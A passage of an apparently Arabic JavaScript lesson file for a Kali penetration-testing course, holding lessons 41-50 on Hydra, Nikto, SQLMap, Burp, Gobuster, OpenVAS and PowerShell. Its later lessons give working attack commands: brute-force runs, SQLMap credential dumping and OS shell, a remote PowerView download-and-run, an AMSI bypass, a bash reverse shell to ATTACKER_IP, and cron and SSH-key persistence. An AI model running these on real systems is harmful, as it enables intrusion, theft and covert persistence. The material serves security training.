  id: 141, icon: '🐉', title: 'Hydra - Brute Force الشبكي',
  desc: 'اختبار كلمات المرور على خدمات الشبكة.', difficulty: 'intermediate', type: 'Password', time: '30-45 دقيقة',
  steps: [
    { title: 'Brute Force SSH', desc: 'اختبر SSH بقاموس.',
      commands: [
        { cmd: 'hydra -l root -P rockyou.txt ssh://192.168.1.10', note: 'Brute Force SSH' },
        { cmd: 'hydra -L users.txt -P passwords.txt ssh://192.168.1.10 -t 4', note: 'قائمة مستخدمين وكلمات مرور' }
      ] },
    { title: 'Brute Force FTP وHTTP', desc: 'اختبر خدمات أخرى.',
      commands: [
        { cmd: 'hydra -l admin -P rockyou.txt ftp://192.168.1.10', note: 'Brute Force FTP' },
        { cmd: 'hydra -l admin -P rockyou.txt http-post-form "192.168.1.10/login:user=^USER^&pass=^PASS^:Invalid"', note: 'Brute Force Web Form' }
      ] },
    { title: 'Brute Force RDP', desc: 'اختبر Remote Desktop.',
      commands: [
        { cmd: 'hydra -l Administrator -P rockyou.txt rdp://192.168.1.10', note: 'Brute Force RDP' }
      ], warning: 'حسابات Windows تُقفل بعد محاولات فاشلة - انتبه!' }
  ]
},

// ─── درس 42: Nikto ──────────────────────────────────────────
{
  id: 142, icon: '🔎', title: 'Nikto - فحص خوادم الويب',
  desc: 'اكتشاف ثغرات وإعدادات خاطئة في خوادم الويب.', difficulty: 'beginner', type: 'Web', time: '30-45 دقيقة',
  steps: [
    { title: 'الفحص الأساسي', desc: 'ابدأ فحصاً شاملاً للخادم.',
      commands: [
        { cmd: 'nikto -h http://192.168.1.10', note: 'فحص Nikto الأساسي' },
        { cmd: 'nikto -h https://target.com', note: 'فحص HTTPS' }
      ] },
    { title: 'فحص على منفذ محدد', desc: 'استهدف منفذاً غير افتراضي.',
      commands: [
        { cmd: 'nikto -h 192.168.1.10 -p 8080', note: 'فحص على منفذ 8080' },
        { cmd: 'nikto -h 192.168.1.10 -p 443 -ssl', note: 'فحص SSL على منفذ 443' }
      ] },
    { title: 'حفظ التقارير', desc: 'احفظ النتائج بصيغ مختلفة.',
      commands: [
        { cmd: 'nikto -h target.com -o report.html -Format html', note: 'تقرير HTML' },
        { cmd: 'nikto -h target.com -o report.xml -Format xml', note: 'تقرير XML' }
      ] }
  ]
},

// ─── درس 43: SQLMap ─────────────────────────────────────────
{
  id: 143, icon: '💉', title: 'SQLMap الشامل',
  desc: 'إتقان SQLMap لاستغلال SQL Injection.', difficulty: 'intermediate', type: 'Web', time: '45-60 دقيقة',
  steps: [
    { title: 'اكتشاف الثغرة', desc: 'أعطِ SQLMap الـ URL المشبوه.',
      commands: [
        { cmd: 'sqlmap -u "http://target.com/page?id=1" --dbs --batch', note: 'اكتشاف وعرض قواعد البيانات' }
      ] },
    { title: 'استخراج البيانات', desc: 'استخرج الجداول والبيانات.',
      commands: [
        { cmd: 'sqlmap -u "http://target.com/page?id=1" -D dbname --tables', note: 'عرض الجداول' },
        { cmd: 'sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C username,password --dump', note: 'استخراج بيانات المستخدمين' }
      ] },
    { title: 'POST Requests', desc: 'اختبر طلبات POST.',
      commands: [
        { cmd: 'sqlmap -r request.txt --dbs --batch', note: 'اختبار من ملف طلب Burp' },
        { cmd: 'sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs', note: 'اختبار POST مباشرة' }
      ] },
    { title: 'الحصول على Shell', desc: 'اطلب OS Shell عبر SQLi.',
      commands: [
        { cmd: 'sqlmap -u "http://target.com/page?id=1" --os-shell', note: 'OS Shell تفاعلي عبر SQLi' }
      ] }
  ]
},

// ─── درس 44: Malware Analysis Kali ──────────────────────────
{
  id: 144, icon: '🦠', title: 'تحليل Malware بـ Kali',
  desc: 'تقنيات تحليل Malware باستخدام أدوات Kali.', difficulty: 'advanced', type: 'Forensics', time: '60-90 دقيقة',
  steps: [
    { title: 'فحص أولي للملف', desc: 'قيّم الملف قبل أي تحليل.',
      commands: [
        { cmd: 'file suspicious_file', note: 'نوع الملف الحقيقي' },
        { cmd: 'strings suspicious_file | head -100', note: 'النصوص المضمنة' },
        { cmd: 'strace ./suspicious_file 2>&1 | grep -E "open|connect|exec"', note: 'مراقبة System Calls' }
      ] },
    { title: 'مراقبة الشبكة', desc: 'التقط اتصالات الـ Malware الشبكية.',
      commands: [
        { cmd: 'sudo tshark -i eth0 -w malware_traffic.pcap &', note: 'بدء التقاط الحزم' },
        { cmd: 'tshark -r malware_traffic.pcap -Y "dns" -T fields -e dns.qry.name', note: 'تحليل استعلامات DNS' }
      ] }
  ]
},

// ─── درس 45: Kali في Docker ─────────────────────────────────
{
  id: 145, icon: '🐳', title: 'Kali في Docker',
  desc: 'تشغيل Kali في بيئة Docker معزولة.', difficulty: 'intermediate', type: 'Setup', time: '30-45 دقيقة',
  steps: [
    { title: 'تشغيل Kali Container', desc: 'شغّل Kali في دقائق بـ Docker.',
      commands: [
        { cmd: 'docker pull kalilinux/kali-rolling', note: 'تحميل صورة Kali' },
        { cmd: 'docker run -it kalilinux/kali-rolling /bin/bash', note: 'تشغيل Container تفاعلي' }
      ] },
    { title: 'تثبيت الأدوات', desc: 'ثبّت الأدوات التي تحتاجها.',
      commands: [
        { cmd: 'apt update && apt install -y nmap sqlmap nikto burpsuite metasploit-framework', note: 'تثبيت أدوات أساسية' }
      ] },
    { title: 'مشاركة الملفات', desc: 'اربط مجلد محلي بالـ Container.',
      commands: [
        { cmd: 'docker run -it -v /home/user/pentest:/opt/results kalilinux/kali-rolling /bin/bash', note: 'مشاركة مجلد النتائج' }
      ] }
  ]
},

// ─── درس 46: Burp Suite Full ────────────────────────────────
{
  id: 146, icon: '🕷️', title: 'Burp Suite الدليل الكامل',
  desc: 'إتقان كامل لـ Burp Suite.', difficulty: 'intermediate', type: 'Web', time: '60-90 دقيقة',
  steps: [
    { title: 'Proxy واعتراض الطلبات', desc: 'الأساس في استخدام Burp.',
      commands: [
        { cmd: 'burpsuite &\n# Firefox: Proxy = 127.0.0.1:8080\n# زر http://burp > CA Certificate', note: 'إعداد Burp Proxy' }
      ] },
    { title: 'استخدام Scanner', desc: 'فحص تلقائي للثغرات.',
      commands: [
        { cmd: '# Target > Site Map > Right Click > Active Scan', note: 'Active Scan على هدف' }
      ] },
    { title: 'Turbo Intruder', desc: 'إرسال آلاف الطلبات بسرعة.',
      commands: [
        { cmd: '# Extensions > BApp Store > Turbo Intruder\n# أرسل طلب > Right Click > Send to Turbo Intruder', note: 'Turbo Intruder للـ Brute Force السريع' }
      ] }
  ]
},

// ─── درس 47: Gobuster ───────────────────────────────────────
{
  id: 147, icon: '🗂️', title: 'Gobuster والـ Directory Brute Force',
  desc: 'اكتشاف المجلدات والملفات المخفية.', difficulty: 'beginner', type: 'Web', time: '30-45 دقيقة',
  steps: [
    { title: 'فحص المجلدات', desc: 'ابحث عن مجلدات مخفية.',
      commands: [
        { cmd: 'gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt', note: 'فحص المجلدات الأساسي' },
        { cmd: 'gobuster dir -u http://target.com -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html,txt,bak', note: 'فحص مع امتدادات' }
      ] },
    { title: 'فحص Subdomains', desc: 'اكتشف النطاقات الفرعية.',
      commands: [
        { cmd: 'gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt', note: 'اكتشاف Subdomains' }
      ] },
    { title: 'ffuf بديل أسرع', desc: 'ffuf أداة fuzzing متعددة الاستخدام.',
      commands: [
        { cmd: 'ffuf -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://target.com/FUZZ', note: 'Directory Fuzzing بـ ffuf' }
      ] }
  ]
},

// ─── درس 48: OpenVAS ────────────────────────────────────────
{
  id: 148, icon: '🛡️', title: 'OpenVAS - فحص الثغرات',
  desc: 'إعداد واستخدام OpenVAS/GVM.', difficulty: 'intermediate', type: 'Scanning', time: '60-90 دقيقة',
  steps: [
    { title: 'تثبيت GVM', desc: 'ثبّت OpenVAS على Kali.',
      commands: [
        { cmd: 'apt install gvm -y\ngvm-setup', note: 'تثبيت وإعداد GVM (يستغرق وقتاً)' },
        { cmd: 'gvm-check-setup', note: 'التحقق من صحة التثبيت' }
      ] },
    { title: 'تشغيل OpenVAS', desc: 'شغّل الخدمات وافتح الواجهة.',
      commands: [
        { cmd: 'gvm-start', note: 'تشغيل جميع خدمات GVM' }
      ], tip: 'افتح https://127.0.0.1:9392 في المتصفح' },
    { title: 'إنشاء Scan', desc: 'أنشئ مهمة فحص وشغّلها.',
      commands: [
        { cmd: '# من الواجهة:\n# Scans > Tasks > New Task\n# حدد الهدف والسياسة\n# Save > Start', note: 'إنشاء مهمة فحص' }
      ] }
  ]
},

// ─── درس 49: PowerShell Advanced ────────────────────────────
{
  id: 149, icon: '💻', title: 'PowerShell المتقدم',
  desc: 'تقنيات PowerShell في Red Teaming.', difficulty: 'advanced', type: 'Exploitation', time: '45-60 دقيقة',
  steps: [
    { title: 'استطلاع AD بـ PowerView', desc: 'استكشف Active Directory.',
      commands: [
        { cmd: 'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")', note: 'تحميل PowerView' },
        { cmd: 'Get-Domain\nGet-DomainUser\nGet-DomainComputer | Select Name,OperatingSystem', note: 'استطلاع AD' }
      ] },
    { title: 'AMSI Bypass', desc: 'تجاوز Windows Defender AMSI.',
      commands: [
        { cmd: '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)', note: 'AMSI Bypass كلاسيكي' }
      ], warning: 'مراقَب بشدة - استخدم في بيئات تدريب فقط' }
  ]
},

// ─── درس 50: Reverse Shell & Persistence ────────────────────
{
  id: 150, icon: '🔄', title: 'Reverse Shell والوصول الدائم',
  desc: 'أساليب الحصول على Shell والـ Persistence.', difficulty: 'advanced', type: 'Exploitation', time: '45-60 دقيقة',
  steps: [
    { title: 'Netcat Reverse Shell', desc: 'أبسط طريقة للـ Reverse Shell.',
      commands: [
        { cmd: 'nc -lvnp 4444', note: 'استمع على جهاز المهاجم' },
        { cmd: 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1', note: 'Reverse Shell من الضحية (Linux)' }
      ] },
    { title: 'تحسين Shell لـ TTY', desc: 'حوّل الـ Shell الخام لـ TTY كامل.',
      commands: [
        { cmd: 'python3 -c "import pty;pty.spawn(\'/bin/bash\')"', note: 'الخطوة الأولى' },
        { cmd: '# اضغط Ctrl+Z\nstty raw -echo; fg\nexport TERM=xterm', note: 'الخطوات الباقية' }
      ] },
    { title: 'Persistence على Linux', desc: 'ضمن الوصول بعد إعادة التشغيل.',
      commands: [
        { cmd: '(crontab -l; echo "@reboot bash -i >& /dev/tcp/IP/4444 0>&1") | crontab -', note: 'Cron Job عند الإقلاع' },
        { cmd: 'echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys', note: 'SSH Key Persistence' }
      ] }
  ]
}

]; // نهاية LESSON_STEPS

console.log('✅ Lesson Steps loaded:', window.LESSON_STEPS.length, 'lessons');
